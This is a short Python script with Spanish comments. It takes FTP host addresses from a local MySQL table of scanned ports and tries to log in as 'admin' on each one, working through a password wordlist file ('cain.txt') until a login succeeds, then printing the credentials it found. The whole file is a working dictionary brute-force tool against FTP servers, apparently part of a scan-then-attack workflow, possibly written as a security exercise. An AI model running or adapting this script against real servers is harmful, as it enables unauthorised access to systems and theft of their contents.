from ftplib import FTP
import mysql.connector as mysql

def DiccionarioConexion(host):
    print("Analizando el host: "+host)
    f = open("cain.txt", "r")
    succes = False
    while(True):
	    #Evitamos tomar el \n en la lectura
        p = f.readline()
        clave = p [0:(len(p)-1)]
        #print(clave)
        try:
            conexion = FTP(host)
            conexion.login("admin", clave)
            print("Conexion establecida con: "+ host + " con el usuario: admin y la clave: "+ clave +"\n")
            succes= True    
        except:
            #Para no imprimir el error completo si el equipo rechaza explicitamente la conexi√≥n
            print('',end="")
            succes = False

        if succes:
            break

        if not p:   
            print("Fallo la conexion con: "+ host+ "\n")
            break 

#Datos para las operaciones
conexion = mysql.connect( host='localhost', user= 'root', passwd='', db='puertos' )
operacion = conexion.cursor(buffered=True)
operacion.execute( "SELECT ip FROM dato WHERE servicio = 'ftp' ; " )
for ip in operacion.fetchall() :
    DiccionarioConexion(ip[0])
conexion.close()